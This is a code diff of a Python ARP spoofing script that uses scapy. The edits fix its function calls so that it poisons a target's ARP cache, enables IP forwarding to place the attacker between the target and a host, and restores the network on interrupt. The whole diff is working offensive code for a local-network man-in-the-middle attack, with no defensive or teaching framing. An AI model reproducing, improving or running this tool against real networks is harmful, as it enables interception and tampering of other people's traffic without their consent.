@@ -41,7 +41,7 @@ def enable_ip_route(verbose=True):
     if verbose:
         print("[!] IP Routing enabled.")
 
-def spoof(targetIP, targetMac, hostIP, verbose=True):
+def spoof(targetIP, hostIP, verbose=True):
     """
     Spoofs `targetIP` saying that we are `hostIP`.
     it is accomplished by changing the ARP cache of the target (poisoning)
@@ -52,10 +52,10 @@ def spoof(targetIP, targetMac, hostIP, verbose=True):
     targetMac = scan(targetIP)[0]["mac"]
     arpResponse = scapy.ARP(pdst=targetIP, hwdst=targetMac, psrc=hostIP, op='is-at')
 
-    scapy.send(arpResponse, verbose=0)
+    scapy.send(arpResponse, verbose=False)
 
     if verbose:
-        selfMac = ARP().hwsrc
+        selfMac = scapy.ARP().hwsrc
         print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, selfMac))
 
 def restore(targetIP, hostIP, verbose=True):
@@ -73,7 +73,7 @@ def restore(targetIP, hostIP, verbose=True):
     # sending the restoring packet
     # to restore the network to its normal process
     # we send each reply seven times for a good measure (count=7)
-    send(arp_response, verbose=0, count=7)
+    scapy.send(arp_response, verbose=0, count=7)
     if verbose:
         print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, hostMAC))
 
@@ -95,7 +95,7 @@ if __name__ == "__main__":
             print(item["ip"], item["mac"], sep = '\t')
 
     # print progress to the screen
-    verbose = True
+    verbose = False
     # enable ip forwarding
     enable_ip_route()
     try:
@@ -109,5 +109,6 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         for target in targets:
-            restore(target, host)
-            restore(host, target)
+            restore(target, host, verbose)
+            restore(host, target, verbose)
+        print("[+] Arp Spoof Stopped")
